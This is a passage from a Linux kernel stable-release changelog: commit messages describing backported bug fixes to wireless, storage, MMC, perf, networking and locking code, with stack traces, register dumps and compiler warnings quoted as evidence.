13) iwl\_fw\_error\_dump gets called and accesses the device
to get debug data
14) iwl\_mvm\_up adds the aux station
15) iwl\_mvm\_add\_aux\_sta() allocates an internal station for
the aux station
16) iwl\_mvm\_allocate\_int\_sta() tests IWL\_MVM\_STATUS\_IN\_HW\_RESTART
and doesn't really allocate a station ID for the aux
station
17) a new queue is added for the aux station
Note that steps from 5 to 9 aren't really part of the
problem but were described for the sake of completeness.
Once the iwl\_mvm\_mac\_stop() is called, the device is not
accessible, meaning that step 12) can't succeed and we'll
see the following:
drivers/net/wireless/intel/iwlwifi/pcie/trans.c:2122 iwl\_trans\_pcie\_grab\_nic\_access+0xc0/0x1d6 [iwlwifi]()
Timeout waiting for hardware access (CSR\_GP\_CNTRL 0x080403d8)
Call Trace:
[] iwl\_trans\_pcie\_grab\_nic\_access+0xc0/0x1d6 [iwlwifi]
[] iwl\_trans\_pcie\_dump\_regs+0x3fd/0x3fd [iwlwifi]
[] iwl\_fw\_error\_dump+0x4f5/0xe8b [iwlwifi]
[] \_\_iwl\_mvm\_mac\_start+0x5a/0x21a [iwlmvm]
[] iwl\_mvm\_mac\_start+0xd4/0x103 [iwlmvm]
[] drv\_start+0xa1/0xc5 [iwl7000\_mac80211]
[] ieee80211\_reconfig+0x145/0xf50 [mac80211]
[] ieee80211\_resume+0x62/0x66 [mac80211]
[] wiphy\_resume+0xa9/0xc6 [cfg80211]
The station id of the aux station is set to 0xff in step 3
and because we don't really allocate a new station id for
the auxliary station (as explained in 16), we end up sending
a command to the firmware asking to connect the queue
to station id 0xff. This makes the firmware crash with the
following information:
0x00002093 | ADVANCED\_SYSASSERT
0x000002F0 | trm\_hw\_status0
0x00000000 | trm\_hw\_status1
0x00000B38 | branchlink2
0x0001978C | interruptlink1
0x00000000 | interruptlink2
0xFF080501 | data1
0xDEADBEEF | data2
0xDEADBEEF | data3
Firmware error during reconfiguration - reprobe!
FW error in SYNC CMD SCD\_QUEUE\_CFG
Fix this by clearing IWL\_MVM\_STATUS\_HW\_RESTART\_REQUESTED
in iwl\_mvm\_mac\_stop(). We won't be able to collect debug
data anyway and when we will brought up again, we will
have a clean state from the firmware perspective.
Since we won't have IWL\_MVM\_STATUS\_IN\_HW\_RESTART set in
step 12) we won't get to the 2093 ASSERT either.
Fixes: bf8b286f86fc ("iwlwifi: mvm: defer setting IWL\_MVM\_STATUS\_IN\_HW\_RESTART")
Signed-off-by: Emmanuel Grumbach
Signed-off-by: Luca Coelho
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0ba5fac205557963db8f360b3c59e4723820e8a3
Author: Shaul Triebitz
Date: Wed Jun 6 17:20:58 2018 +0300
iwlwifi: pcie: avoid empty free RB queue
[ Upstream commit 868a1e863f95183f00809363fefba6d4f5bcd116 ]
If all free RB queues are empty, the driver will never restock the
free RB queue. That's because the restocking happens in the Rx flow,
and if the free queue is empty there will be no Rx.
Although there's a background worker (a.k.a. allocator) allocating
memory for RBs so that the Rx handler can restock them, the worker may
run only after the free queue has become empty (and then it is too
late for restocking as explained above).
There is a solution for that called 'emergency': If the number of used
RB's reaches half the amount of all RB's, the Rx handler will not wait
for the allocator but immediately allocate memory for the used RB's
and restock the free queue.
But, since the used RB's is per queue, it may happen that the used
RB's are spread between the queues such that the emergency check will
fail for each of the queues
(and still run out of RBs, causing the above symptom).
To fix it, move to emergency mode if the sum of \*all\* used RBs (for
all Rx queues) reaches half the amount of all RB's
Signed-off-by: Shaul Triebitz
Signed-off-by: Luca Coelho
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9cc1cbc1c6ff5ca8558bc65c93db93852544a7a9
Author: Masahiro Yamada
Date: Fri Sep 28 13:16:01 2018 +0900
mtd: rawnand: denali: set SPARE\_AREA\_SKIP\_BYTES register to 8 if unset
[ Upstream commit 0d55c668b218a1db68b5044bce4de74e1bd0f0c8 ]
NAND devices need additional data area (OOB) for error correction,
but it is also used for Bad Block Marker (BBM). In many cases, the
first byte in OOB is used for BBM, but the location actually depends
on chip vendors. The NAND controller should preserve the precious
BBM to keep track of bad blocks.
In Denali IP, the SPARE\_AREA\_SKIP\_BYTES register is used to specify
the number of bytes to skip from the start of OOB. The ECC engine
will automatically skip the specified number of bytes when it gets
access to OOB area.
The same value for SPARE\_AREA\_SKIP\_BYTES should be used between
firmware and the operating system if you intend to use the NAND
device across the control hand-off.
In fact, the current denali.c code expects firmware to have already
set the SPARE\_AREA\_SKIP\_BYTES register, then reads the value out.
If no firmware (or bootloader) has initialized the controller, the
register value is zero, which is the default after power-on-reset.
In other words, the Linux driver cannot initialize the controller
by itself.
Some possible solutions are:
[1] Add a DT property to specify the skipped bytes in OOB
[2] Associate the preferred value with compatible
[3] Hard-code the default value in the driver
My first attempt was [1], but in the review process, [3] was suggested
as a counter-implementation.
(https://lore.kernel.org/patchwork/patch/983055/)
The default value 8 was chosen to match to the boot ROM of the UniPhier
platform. The preferred value may vary by platform. If so, please
trade up to a different solution.
Signed-off-by: Masahiro Yamada
Reviewed-by: Boris Brezillon
Signed-off-by: Miquel Raynal
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit cf6e9d033d95b06f198b88df22e4942a61569f3d
Author: Wang Dongsheng
Date: Thu Aug 16 12:48:42 2018 +0800
sdhci: acpi: add free\_slot callback
[ Upstream commit c7eabbee3de99347105faa7fd925a500ccf43baf ]
The device specific resource can be free in free\_slot after
removing host controller.
Signed-off-by: Wang Dongsheng
Acked-by: Adrian Hunter
Signed-off-by: Ulf Hansson
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3625a5515a8474314b5c48524a245f4e4cfb3a3c
Author: Yu Zhao
Date: Sun Sep 23 14:39:24 2018 -0600
mmc: sdhci-pci-o2micro: Add quirk for O2 Micro dev 0x8620 rev 0x01
[ Upstream commit 5169894982bb67486d93cc1e10151712bb86bcb6 ]
This device reports SDHCI\_CLOCK\_INT\_STABLE even though it's not
ready to take SDHCI\_CLOCK\_CARD\_EN. The symptom is that reading
SDHCI\_CLOCK\_CONTROL after enabling the clock shows absence of the
bit from the register (e.g. expecting 0x0000fa07 = 0x0000fa03 |
SDHCI\_CLOCK\_CARD\_EN but only observed the first operand).
mmc1: Timeout waiting for hardware cmd interrupt.
mmc1: sdhci: ============ SDHCI REGISTER DUMP ===========
mmc1: sdhci: Sys addr: 0x00000000 | Version: 0x00000603
mmc1: sdhci: Blk size: 0x00000000 | Blk cnt: 0x00000000
mmc1: sdhci: Argument: 0x00000000 | Trn mode: 0x00000000
mmc1: sdhci: Present: 0x01ff0001 | Host ctl: 0x00000001
mmc1: sdhci: Power: 0x0000000f | Blk gap: 0x00000000
mmc1: sdhci: Wake-up: 0x00000000 | Clock: 0x0000fa03
mmc1: sdhci: Timeout: 0x00000000 | Int stat: 0x00000000
mmc1: sdhci: Int enab: 0x00ff0083 | Sig enab: 0x00ff0083
mmc1: sdhci: AC12 err: 0x00000000 | Slot int: 0x00000000
mmc1: sdhci: Caps: 0x25fcc8bf | Caps\_1: 0x00002077
mmc1: sdhci: Cmd: 0x00000000 | Max curr: 0x005800c8
mmc1: sdhci: Resp[0]: 0x00000000 | Resp[1]: 0x00000000
mmc1: sdhci: Resp[2]: 0x00000000 | Resp[3]: 0x00000000
mmc1: sdhci: Host ctl2: 0x00000008
mmc1: sdhci: ADMA Err: 0x00000000 | ADMA Ptr: 0x00000000
mmc1: sdhci: ============================================
The problem happens during wakeup from S3. Adding a delay quirk
after power up reliably fixes the problem.
Signed-off-by: Yu Zhao
Signed-off-by: Ulf Hansson
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 79b8a3dd423b6fd4bd6486851c900301679b2cf4
Author: Ben Peddell
Date: Mon Oct 8 20:41:13 2018 +0800
bcache: Populate writeback\_rate\_minimum attribute
[ Upstream commit 7567c2a2ad9e80a2ce977eef535e64b61899633e ]
Forgot to include the maintainers with my first email.
Somewhere between Michael Lyle's original
"bcache: PI controller for writeback rate V2" patch dated 07 Sep 2017
and 1d316e6 bcache: implement PI controller for writeback rate,
the mapping of the writeback\_rate\_minimum attribute was dropped.
Re-add the missing sysfs writeback\_rate\_minimum attribute mapping to
"allow the user to specify a minimum rate at which dirty blocks are
retired."
Fixes: 1d316e6 ("bcache: implement PI controller for writeback rate")
Signed-off-by: Ben Peddell
Signed-off-by: Coly Li
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 47f03c780e1222aaade358307f1b4fa8815ec1f9
Author: Prarit Bhargava
Date: Mon Oct 8 11:06:19 2018 -0400
cpupower: Fix coredump on VMWare
[ Upstream commit f69ffc5d3db8f1f03fd6d1df5930f9a1fbd787b6 ]
cpupower crashes on VMWare guests. The guests have the AMD PStateDef MSR
(0xC0010064 + state number) set to zero. As a result fid and did are zero
and the crash occurs because of a divide by zero (cof = fid/did). This
can be prevented by checking the enable bit in the PStateDef MSR before
calculating cof. By doing this the value of pstate[i] remains zero and
the value can be tested before displaying the active Pstates.
Check the enable bit in the PstateDef register for all supported families
and only print out enabled Pstates.
Signed-off-by: Prarit Bhargava
Cc: Shuah Khan
Cc: Stafford Horne
Signed-off-by: Shuah Khan (Samsung OSG)
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ce081fc137c8e5808396a5e0ea85af9d239e42c1
Author: Sanskriti Sharma
Date: Tue Oct 2 10:29:10 2018 -0400
perf strbuf: Match va\_{add,copy} with va\_end
[ Upstream commit ce49d8436cffa9b7a6a5f110879d53e89dbc6746 ]
Ensure that all code paths in strbuf\_addv() call va\_end() on the
ap\_saved copy that was made.
Fixes the following coverity complaint:
Error: VARARGS (CWE-237): [#def683]
tools/perf/util/strbuf.c:106: missing\_va\_end: va\_end was not called
for "ap\_saved".
Signed-off-by: Sanskriti Sharma
Reviewed-by: Jiri Olsa
Cc: Joe Lawrence
Link: http://lkml.kernel.org/r/1538490554-8161-2-git-send-email-sansharm@redhat.com
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9aa0d85d5d8afa1dd3b7dd7e5a5f442d3445d182
Author: Sanskriti Sharma
Date: Tue Oct 2 10:29:12 2018 -0400
perf tools: Free 'printk' string in parse\_ftrace\_printk()
[ Upstream commit 9c8a182e5a73e01afd11742a2ab887bf338fdafd ]
parse\_ftrace\_printk() tokenizes and parses a line, calling strdup() each
iteration. Add code to free this temporary format string duplicate.
Fixes the following coverity complaints:
Error: RESOURCE\_LEAK (CWE-772):
tools/perf/util/trace-event-parse.c:158: overwrite\_var: Overwriting
"printk" in "printk = strdup(fmt + 1)" leaks the storage that "printk"
points to.
tools/perf/util/trace-event-parse.c:162: leaked\_storage: Variable
"printk" going out of scope leaks the storage it points to.
Signed-off-by: Sanskriti Sharma
Reviewed-by: Jiri Olsa
Cc: Joe Lawrence
Link: http://lkml.kernel.org/r/1538490554-8161-4-git-send-email-sansharm@redhat.com
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit b2ad2430bd75dad1b0a708c833ebc41bb9aff0fd
Author: Sanskriti Sharma
Date: Tue Oct 2 10:29:11 2018 -0400
perf tools: Cleanup trace-event-info 'tdata' leak
[ Upstream commit faedbf3fd19f2511a39397f76359e4cc6ee93072 ]
Free tracing\_data structure in tracing\_data\_get() error paths.
Fixes the following coverity complaint:
Error: RESOURCE\_LEAK (CWE-772):
leaked\_storage: Variable "tdata" going out of scope leaks the storage
Signed-off-by: Sanskriti Sharma
Reviewed-by: Jiri Olsa
Cc: Joe Lawrence
Link: http://lkml.kernel.org/r/1538490554-8161-3-git-send-email-sansharm@redhat.com
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 8e4b824648dbe402d9dbbf05959c618c745ff590
Author: Sanskriti Sharma
Date: Tue Oct 2 10:29:14 2018 -0400
perf tools: Free temporary 'sys' string in read\_event\_files()
[ Upstream commit 1e44224fb0528b4c0cc176bde2bb31e9127eb14b ]
For each system in a given pevent, read\_event\_files() reads in a
temporary 'sys' string. Be sure to free this string before moving onto
to the next system and/or leaving read\_event\_files().
Fixes the following coverity complaints:
Error: RESOURCE\_LEAK (CWE-772):
tools/perf/util/trace-event-read.c:343: overwrite\_var: Overwriting
"sys" in "sys = read\_string()" leaks the storage that "sys" points to.
tools/perf/util/trace-event-read.c:353: leaked\_storage: Variable "sys"
going out of scope leaks the storage it points to.
Signed-off-by: Sanskriti Sharma
Reviewed-by: Jiri Olsa
Cc: Joe Lawrence
Link: http://lkml.kernel.org/r/1538490554-8161-6-git-send-email-sansharm@redhat.com
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit c2128082a94ee9d2b4c34cac029dc95d72ecc891
Author: Nathan Chancellor
Date: Mon Oct 8 11:08:47 2018 -0700
spi: spi-ep93xx: Use dma\_data\_direction for ep93xx\_spi\_dma\_{finish,prepare}
[ Upstream commit a1108c7b2efb892350ba6a0e932dfd45622f4e2b ]
Clang warns when one enumerated type is implicitly converted to another.
drivers/spi/spi-ep93xx.c:342:62: warning: implicit conversion from
enumeration type 'enum dma\_transfer\_direction' to different enumeration
type 'enum dma\_data\_direction' [-Wenum-conversion]
nents = dma\_map\_sg(chan->device->dev, sgt->sgl, sgt->nents, dir);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~
./include/linux/dma-mapping.h:428:58: note: expanded from macro
'dma\_map\_sg'
#define dma\_map\_sg(d, s, n, r) dma\_map\_sg\_attrs(d, s, n, r, 0)
~~~~~~~~~~~~~~~~ ^
drivers/spi/spi-ep93xx.c:348:57: warning: implicit conversion from
enumeration type 'enum dma\_transfer\_direction' to different enumeration
type 'enum dma\_data\_direction' [-Wenum-conversion]
dma\_unmap\_sg(chan->device->dev, sgt->sgl, sgt->nents, dir);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~
./include/linux/dma-mapping.h:429:62: note: expanded from macro
'dma\_unmap\_sg'
#define dma\_unmap\_sg(d, s, n, r) dma\_unmap\_sg\_attrs(d, s, n, r, 0)
~~~~~~~~~~~~~~~~~~ ^
drivers/spi/spi-ep93xx.c:377:56: warning: implicit conversion from
enumeration type 'enum dma\_transfer\_direction' to different enumeration
type 'enum dma\_data\_direction' [-Wenum-conversion]
dma\_unmap\_sg(chan->device->dev, sgt->sgl, sgt->nents, dir);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~
./include/linux/dma-mapping.h:429:62: note: expanded from macro
'dma\_unmap\_sg'
#define dma\_unmap\_sg(d, s, n, r) dma\_unmap\_sg\_attrs(d, s, n, r, 0)
~~~~~~~~~~~~~~~~~~ ^
3 warnings generated.
dma\_{,un}map\_sg expect an enum of type dma\_data\_direction but this
driver uses dma\_transfer\_direction for everything. Convert the driver to
use dma\_data\_direction for these two functions.
There are two places that strictly require an enum of type
dma\_transfer\_direction: the direction member in struct dma\_slave\_config
and the direction parameter in dmaengine\_prep\_slave\_sg. To avoid using
an explicit cast, add a simple function, ep93xx\_dma\_data\_to\_trans\_dir,
to safely map between the two types because they are not 1 to 1 in
meaning.
Signed-off-by: Nathan Chancellor
Reviewed-by: Nick Desaulniers
Reviewed-by: Mika Westerberg
Signed-off-by: Mark Brown
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 013b559adfc09cb569086c4cee08235e501381f2
Author: Javier González
Date: Tue Oct 9 13:11:35 2018 +0200
lightnvm: pblk: fix race condition on metadata I/O
[ Upstream commit d8adaa3b86324c6186d0adf74bc256bdacfffdb6 ]
In pblk, when a new line is allocated, metadata for the previously
written line is scheduled. This is done through a fixed memory region
that is shared through time and contexts across different lines and
therefore protected by a lock. Unfortunately, this lock is not properly
covering all the metadata used for sharing this memory regions,
resulting in a race condition.
This patch fixes this race condition by protecting this metadata
properly.
Fixes: dd2a43437337 ("lightnvm: pblk: sched. metadata on write thread")
Signed-off-by: Javier González
Signed-off-by: Matias Bjørling
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3c5b1d33fc908f3c7b947bbe3bf88ca5b95268f0
Author: Jia-Ju Bai
Date: Tue Oct 9 13:12:00 2018 +0200
lightnvm: pblk: fix two sleep-in-atomic-context bugs
[ Upstream commit 7325b4bbe5952e3e939f15de812f2ee0c0d33ca9 ]
The driver may sleep with holding a spinlock.
The function call paths (from bottom to top) in Linux-4.16 are:
[FUNC] nvm\_dev\_dma\_alloc(GFP\_KERNEL)
drivers/lightnvm/pblk-core.c, 754:
nvm\_dev\_dma\_alloc in pblk\_line\_submit\_smeta\_io
drivers/lightnvm/pblk-core.c, 1048:
pblk\_line\_submit\_smeta\_io in pblk\_line\_init\_bb
drivers/lightnvm/pblk-core.c, 1434:
pblk\_line\_init\_bb in pblk\_line\_replace\_data
drivers/lightnvm/pblk-recovery.c, 980:
pblk\_line\_replace\_data in pblk\_recov\_l2p
drivers/lightnvm/pblk-recovery.c, 976:
spin\_lock in pblk\_recov\_l2p
[FUNC] bio\_map\_kern(GFP\_KERNEL)
drivers/lightnvm/pblk-core.c, 762:
bio\_map\_kern in pblk\_line\_submit\_smeta\_io
drivers/lightnvm/pblk-core.c, 1048:
pblk\_line\_submit\_smeta\_io in pblk\_line\_init\_bb
drivers/lightnvm/pblk-core.c, 1434:
pblk\_line\_init\_bb in pblk\_line\_replace\_data
drivers/lightnvm/pblk-recovery.c, 980:
pblk\_line\_replace\_data in pblk\_recov\_l2p
drivers/lightnvm/pblk-recovery.c, 976:
spin\_lock in pblk\_recov\_l2p
To fix these bugs, the call to pblk\_line\_replace\_data()
is moved out of the spinlock protection.
These bugs are found by my static analysis tool DSAC.
Signed-off-by: Jia-Ju Bai
Reviewed-by: Javier González
Signed-off-by: Matias Bjørling
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit bd206a06a712f2c345940595f53d49a14386f6cf
Author: Javier González
Date: Tue Oct 9 13:12:07 2018 +0200
lightnvm: pblk: fix race on sysfs line state
[ Upstream commit 44cdbdc657b23f75736eca3e88b781f009104363 ]
pblk exposes a sysfs interface that represents its internal state. Part
of this state is the map bitmap for the current open line, which should
be protected by the line lock to avoid a race when freeing the line
metadata. Currently, it is not.
This patch makes sure that the line state is consistent and NULL
bitmap pointers are not dereferenced.
Signed-off-by: Javier González
Signed-off-by: Matias Bjørling
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 5764ffc8a643add918a977cee0e945d57bd0563d
Author: Thierry Reding
Date: Fri Sep 21 12:10:48 2018 +0200
hwmon: (pwm-fan) Set fan speed to 0 on suspend
[ Upstream commit 95dcd64bc5a27080beaa344edfe5bdcca3d2e7dc ]
Technically this is not required because disabling the PWM should be
enough. However, when support for atomic operations was implemented in
the PWM subsystem, only actual changes to the PWM channel are applied
during pwm\_config(), which means that during after resume from suspend
the old settings won't be applied.
One possible solution is for the PWM driver to implement its own PM
operations such that settings from before suspend get applied on resume.
This has the disadvantage of completely ignoring any particular ordering
requirements that PWM user drivers might have, so it is best to leave it
up to the user drivers to apply the settings that they want at the
appropriate time.
Another way to solve this would be to read back the current state of the
PWM at the time of resume. That way, in case the configuration was lost
during suspend, applying the old settings in PWM user drivers would
actually get them applied because they differ from the current settings.
However, not all PWM drivers support reading the hardware state, and not
all hardware may support it.
The best workaround at this point seems to be to let PWM user drivers
tell the PWM subsystem that the PWM is turned off by, in addition to
disabling it, also setting the duty cycle to 0. This causes the resume
operation to apply a configuration that is different from the current
configuration, resulting in the proper state from before suspend getting
restored.
Signed-off-by: Thierry Reding
Signed-off-by: Guenter Roeck
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit bb1d8085e24422ac7788182ffd00d9e86540ec2a
Author: Janosch Frank
Date: Tue Oct 2 10:57:52 2018 +0200
s390/sthyi: Fix machine name validity indication
[ Upstream commit b5130dc2224d1881f24224c0590c6d97f2168d6a ]
When running as a level 3 guest with no host provided sthyi support
sclp\_ocf\_cpc\_name\_copy() will only return zeroes. Zeroes are not a
valid group name, so let's not indicate that the group name field is
valid.
Also the group name is not dependent on stsi, let's not return based
on stsi before setting it.
Fixes: 95ca2cb57985 ("KVM: s390: Add sthyi emulation")
Signed-off-by: Janosch Frank
Signed-off-by: Martin Schwidefsky
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 45d66e3d98eafffde9f7087f78e0a303e715c8b2
Author: Serhey Popovych
Date: Tue Oct 9 21:21:01 2018 +0300
tun: Consistently configure generic netdev params via rtnetlink
[ Upstream commit df52eab23d703142c766ac00bdb8db19d71238d0 ]
Configuring generic network device parameters on tun will fail in
presence of IFLA\_INFO\_KIND attribute in IFLA\_LINKINFO nested attribute
since tun\_validate() always return failure.
This can be visualized with following ip-link(8) command sequences:
# ip link set dev tun0 group 100
# ip link set dev tun0 group 100 type tun
RTNETLINK answers: Invalid argument
with contrast to dummy and veth drivers:
# ip link set dev dummy0 group 100
# ip link set dev dummy0 type dummy
# ip link set dev veth0 group 100
# ip link set dev veth0 group 100 type veth
Fix by returning zero in tun\_validate() when @data is NULL that is
always in case since rtnl\_link\_ops->maxtype is zero in tun driver.
Fixes: f019a7a594d9 ("tun: Implement ip link del tunXXX")
Signed-off-by: Serhey Popovych
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 2951868e6d65dced9267f1631e2f649cebe73e68
Author: Ryan C Goodfellow
Date: Fri Oct 12 11:09:01 2018 -0700
nfp: devlink port split support for 1x100G CXP NIC
[ Upstream commit 5948185b97fa1f83d7855e638a72982a1073ebf5 ]
This commit makes it possible to use devlink to split the 100G CXP
Netronome into two 40G interfaces. Currently when you ask for 2
interfaces, the math in src/nfp\_devlink.c:nfp\_devlink\_port\_split
calculates that you want 5 lanes per port because for some reason
eth\_port.port\_lanes=10 (shouldn't this be 12 for CXP?). What we really
want when asking for 2 breakout interfaces is 4 lanes per port. This
commit makes that happen by calculating based on 8 lanes if 10 are
present.
Signed-off-by: Ryan C Goodfellow
Reviewed-by: Jakub Kicinski
Reviewed-by: Greg Weeks
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3d7d10b9af53f31b1f614d658664801ece85895d
Author: Haiyang Zhang
Date: Mon Oct 15 19:06:15 2018 +0000
hv\_netvsc: fix vf serial matching with pci slot info
[ Upstream commit 005479556197f80139771960dda0dfdcd2d2aad5 ]
The VF device's serial number is saved as a string in PCI slot's
kobj name, not the slot->number. This patch corrects the netvsc
driver, so the VF device can be successfully paired with synthetic
NIC.
Fixes: 00d7ddba1143 ("hv\_netvsc: pair VF based on serial number")
Reported-by: Vitaly Kuznetsov
Signed-off-by: Haiyang Zhang
Reviewed-by: Stephen Hemminger
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit b85000e84c56eadca14c690170e5f7b997009f9d
Author: Suzuki K Poulose
Date: Tue Oct 9 14:47:05 2018 +0100
arm64: cpufeature: ctr: Fix cpu capability check for late CPUs
[ Upstream commit 8ab66cbe63aeaf9e5970fb4aaef1c660fca59321 ]
The matches() routine for a capability must honor the "scope"
passed to it and return the proper results.
i.e, when passed with SCOPE\_LOCAL\_CPU, it should check the
status of the capability on the current CPU. This is used by
verify\_local\_cpu\_capabilities() on a late secondary CPU to make
sure that it's compliant with the established system features.
However, ARM64\_HAS\_CACHE\_{IDC/DIC} always checks the system wide
registers and this could mean that a late secondary CPU could return
"true" (since the CPU hasn't updated the system wide registers yet)
and thus lead the system in an inconsistent state, where
the system assumes it has IDC/DIC feature, while the new CPU
doesn't.
Fixes: commit 6ae4b6e0578886eb36 ("arm64: Add support for new control bits CTR\_EL0.DIC and CTR\_EL0.IDC")
Cc: Philip Elcan
Cc: Shanker Donthineni
Cc: Mark Rutland
Cc: Will Deacon
Signed-off-by: Suzuki K Poulose
Signed-off-by: Catalin Marinas
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 2ee36fb7c3a635d9db4e7692a14e31535c273a22
Author: Omar Sandoval
Date: Thu Oct 11 12:20:41 2018 -0700
swim: fix cleanup on setup error
[ Upstream commit 1448a2a5360ae06f25e2edc61ae070dff5c0beb4 ]
If we fail to allocate the request queue for a disk, we still need to
free that disk, not just the previous ones. Additionally, we need to
cleanup the previous request queues.
Signed-off-by: Omar Sandoval
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 8e00f4525729f11c22591104030da188bb3fe4b0
Author: Omar Sandoval
Date: Thu Oct 11 12:20:49 2018 -0700
ataflop: fix error handling during setup
[ Upstream commit 71327f547ee3a46ec5c39fdbbd268401b2578d0e ]
Move queue allocation next to disk allocation to fix a couple of issues:
- If add\_disk() hasn't been called, we should clear disk->queue before
calling put\_disk().
- If we fail to allocate a request queue, we still need to put all of
the disks, not just the ones that we allocated queues for.
Signed-off-by: Omar Sandoval
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 703acc3265c392b6e390f8e045a8c492c3ae6968
Author: Paolo Abeni
Date: Tue Oct 16 16:52:05 2018 +0200
netfilter: xt\_nat: fix DNAT target for shifted portmap ranges
[ Upstream commit cb20f2d2c0507d60d94ef896991e95708f051dd1 ]
The commit 2eb0f624b709 ("netfilter: add NAT support for shifted
portmap ranges") did not set the checkentry/destroy callbacks for
the newly added DNAT target. As a result, rulesets using only
such nat targets are not effective, as the relevant conntrack hooks
are not enabled.
The above affect also nft\_compat rulesets.
Fix the issue adding the missing initializers.
Fixes: 2eb0f624b709 ("netfilter: add NAT support for shifted portmap ranges")
Signed-off-by: Paolo Abeni
Signed-off-by: Pablo Neira Ayuso
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 117d5fbddd39a7de3c5ad400d9564ef70fe669cd
Author: Waiman Long
Date: Thu Oct 18 21:45:17 2018 -0400
locking/lockdep: Fix debug\_locks off performance problem
[ Upstream commit 9506a7425b094d2f1d9c877ed5a78f416669269b ]
It was found that when debug\_locks was turned off because of a problem
found by the lockdep code, the system performance could drop quite
significantly when the lock\_stat code was also configured into the
kernel. For instance, parallel kernel build time on a 4-socket x86-64
server nearly doubled.
Further analysis into the cause of the slowdown traced back to the
frequent call to debug\_locks\_off() from the \_\_lock\_acquired() function
probably due to some inconsistent lockdep states with debug\_locks
off. The debug\_locks\_off() function did an unconditional atomic xchg
to write a 0 value into debug\_locks which had already been set to 0.
This led to severe cacheline contention in the cacheline that held
debug\_locks. As debug\_locks is being referenced in quite a few different
places in the kernel, this greatly slow down the system performance.
To prevent that trashing of debug\_locks cacheline, lock\_acquired()
and lock\_contended() now checks the state of debug\_locks before
proceeding. The debug\_locks\_off() function is also modified to check
debug\_locks before calling \_\_debug\_locks\_off().
Signed-off-by: Waiman Long
Cc: Andrew Morton
Cc: Linus Torvalds
Cc: Paul E. McKenney
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Cc: Will Deacon
Link: http://lkml.kernel.org/r/1539913518-15598-1-git-send-email-longman@redhat.com
Signed-off-by: Ingo Molnar
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3fdf483bcf76ab19cf4412c6cac31135d7eda30e
Author: Eric Dumazet
Date: Fri Oct 19 19:11:26 2018 -0700
net: loopback: clear skb->tstamp before netif\_rx()
[ Upstream commit 4c16128b6271e70c8743178e90cccee147858503 ]
At least UDP / TCP stacks can now cook skbs with a tstamp using
MONOTONIC base (or arbitrary values with SCM\_TXTIME)
Since loopback driver does not call (directly or indirectly)
skb\_scrub\_packet(), we need to clear skb->tstamp so that
net\_timestamp\_check() can eventually resample the time,
using ktime\_get\_real().
Fixes: 80b14dee2bea ("net: Add a new socket option for a future transmit time.")
Fixes: fb420d5d91c1 ("tcp/fq: move back to CLOCK\_MONOTONIC")
Signed-off-by: Eric Dumazet
Cc: Willem de Bruijn
Cc: Soheil Hassas Yeganeh
Acked-by: Soheil Hassas Yeganeh
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit cf5819b288283892459297a8a6ddc33f279ab611
Author: Masahisa Kojima
Date: Tue Oct 23 20:24:28 2018 +0900
net: socionext: Reset tx queue in ndo\_stop
[ Upstream commit 8d5b0bf611ec5b7618d5b772dddc93b8afa78cb8 ]
We observed that packets and bytes count are not reset
when user performs interface down. Eventually, tx queue is
exhausted and packets will not be sent out.
To avoid this problem, resets tx queue in ndo\_stop.
Fixes: 533dd11a12f6 ("net: socionext: Add Synquacer NetSec driver")
Signed-off-by: Masahisa Kojima
Signed-off-by: Yoshitoyo Osaki
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3f8141b1429921f58e8c16ff09a9c3831017ef14
Author: Marek Szyprowski
Date: Wed Sep 5 12:02:15 2018 +0200
ARM: dts: exynos: Disable pull control for MAX8997 interrupts on Origen
commit f5e758b8358f6c27e8a351ddf0b441a64cdabb94 upstream.
PMIC\_IRQB and PMIC\_KEYINB lines on Exynos4210-based Origen board have
external pull-up resistors, so disable any pull control for those lines
